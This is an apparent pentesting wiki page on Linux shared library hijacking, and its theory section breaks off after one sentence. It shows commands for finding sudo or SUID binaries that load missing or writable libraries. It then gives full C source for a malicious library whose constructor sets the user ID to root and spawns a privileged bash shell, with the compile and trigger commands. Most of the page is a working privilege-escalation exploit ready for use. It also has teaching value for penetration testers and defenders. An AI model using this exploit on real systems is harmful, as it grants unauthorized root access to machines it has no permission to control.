# Shared Library Hijacking

## Theory

Shared libraries are libraries that are loaded by programs when they start. If

## Practice

{% tabs %}
{% tab title="Enumerate" %}
If you find some binary with **SUDO** permissions, you could check if all the **.so** files are **loaded correctly**

```bash
strace the-sudo-bin 2>&1 | grep -i -E "open|access|no such file"
```

You also could check if the **SUDO** binary is loading a library from a folder **where we can write**:

```bash
# Lets find a SUID using a non-standard library
ldd the-sudo-bin
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d the-sudo-bin | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Alternatively, you can use the `strings` command to find used shared library

```bash
strings ./the-sudo-bin | grep -i '*.so*'
```
{% endtab %}

{% tab title="Exploit" %}
For example, if you find that the **sudo** binary **doesn't** **load correctly** _`/home/user/.config/libcalc.so`_ or that you can overwrite it, you can exploit it.

Write a malicious shared library

```c
//Saved to /home/user/.config/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Compile it

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

Execute the **SUDO** binary

```bash
sudo the-sudo-bin
```

{% hint style="info" %}
If you get an error such as

```shell-session
./the-sudo-bin: symbol lookup error: ./the-sudo-bin: undefined symbol: a_function_name
```

that means that the library you have generated need to have a function called `a_function_name`.
{% endhint %}
{% endtab %}
{% endtabs %}
